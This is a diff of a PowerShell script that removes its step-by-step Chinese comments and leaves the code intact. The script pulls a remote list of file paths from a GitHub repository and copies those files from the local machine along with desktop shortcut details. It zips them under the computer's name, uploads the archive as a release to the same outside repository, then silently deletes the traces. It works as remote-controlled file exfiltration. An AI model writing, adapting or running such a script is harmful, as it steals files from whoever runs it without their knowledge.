@@ -1,22 +1,22 @@
 # === main.ps1 ===
 
-# ✅ 自动解除阻止（避免运行时出现确认提示）
+# ✅ 
 try {
     Unblock-File -Path $MyInvocation.MyCommand.Path -ErrorAction SilentlyContinue
 } catch {}
 
-# ✅ 设置 UTF-8 输出编码
+# ✅ 
 [Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 $OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 
-# ✅ 获取 GitHub Token
+# ✅ 
 $token = $env:GH_UPLOAD_EY
 if (-not $token) {
     Write-Error "❌ 环境变量 GH_UPLOAD_KEY 未设置，无法上传文件到 GitHub"
     return
 }
 
-# ✅ 基本信息设置
+# ✅
 $repo = "rtyuiuiop/1"
 $now = Get-Date
 $timestamp = $now.ToString("yyyy-MM-dd-HHmmss")
@@ -29,7 +29,7 @@ $zipName = "package-$computerName-$timestamp.zip"
 $zipPath = Join-Path $env:TEMP $zipName
 New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null
 
-# ✅ STEP 1: 远程路径列表
+# ✅ 
 $remoteTxtUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/refs/heads/main/.github/upload-paths.txt"
 try {
     $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
@@ -39,7 +39,7 @@ try {
     return
 }
 
-# ✅ STEP 2: 拷贝目标文件
+# ✅ 
 $index = 0
 foreach ($path in $pathList) {
     $index++
@@ -59,7 +59,7 @@ foreach ($path in $pathList) {
     } catch {}
 }
 
-# ✅ STEP 3: 收集桌面 .lnk 快捷方式信息
+# ✅ 
 try {
     $desktop = [Environment]::GetFolderPath("Desktop")
     $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
@@ -80,7 +80,7 @@ try {
     $lnkReport | Out-File -FilePath $lnkOutputFile -Encoding utf8
 } catch {}
 
-# ✅ STEP 4: 压缩归档
+# ✅ 
 try {
     Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force -ErrorAction Stop
 } catch {
@@ -88,7 +88,7 @@ try {
     return
 }
 
-# ✅ STEP 5: 上传 Release
+# ✅ 
 $releaseData = @{
     tag_name    = $tag
     name        = $releaseName
@@ -123,6 +123,6 @@ try {
     Write-Warning "❌ 上传文件失败"
 }
 
-# ✅ STEP 6: 清理临时文件
+# ✅ 
 Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
